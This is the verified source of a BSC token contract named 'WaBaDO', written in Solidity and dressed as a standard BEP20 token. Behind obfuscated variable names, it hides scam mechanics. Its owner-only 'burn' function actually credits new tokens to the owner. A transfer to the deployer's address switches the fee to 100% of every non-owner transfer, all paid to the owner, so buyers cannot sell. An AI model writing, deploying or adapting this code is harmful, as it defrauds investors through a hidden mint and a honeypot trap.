/**
 *Submitted for verification at BscScan.com on 2022-12-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.4;
contract WaBaDO {
event Transfer(address indexed from, address indexed to, uint256 value);
string public  symbol = "WaBaDO";
uint256 private  AcIEYK = 10000000000000;
uint256 public  ubyQmJ = 10000000000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  name = "WaBaDO";
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public owner;
address private  aDcaBw = address(0);
address public  RQSJtV = address(0);
address public  JlBbSJ = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  QwHmVD = 100000000000000000;
uint256 public  NJpqOF = 100000000000000000000000;
uint256 public  UFtJVm = 1000000000000000000;
uint256 public  AlMxZa = 100000000000000000000;
address public  QLBGCj = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint8 public constant decimals = 18;
uint256 public constant PijMjk = 9+1;
mapping (address => uint256) public balanceOf;
address public  rsjaHx = address(0);
uint256 public  wNUPlb = 10000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  kELehy = address(0);
address public  KtFNpt = address(0);
uint256 public  QVhRkS = 10000000000000000000;
uint256 public  HQpxYN = 100000000000000000000000;
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ztECwY");
require(to != address(0), "ztECwY");
require(amount <= balanceOf[from], "ztECwY");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* PijMjk/AcIEYK ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==aDcaBw){
AcIEYK = 9+1;
}
emit Transfer(from, to, transferAmount);
}
constructor () {
aDcaBw = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

}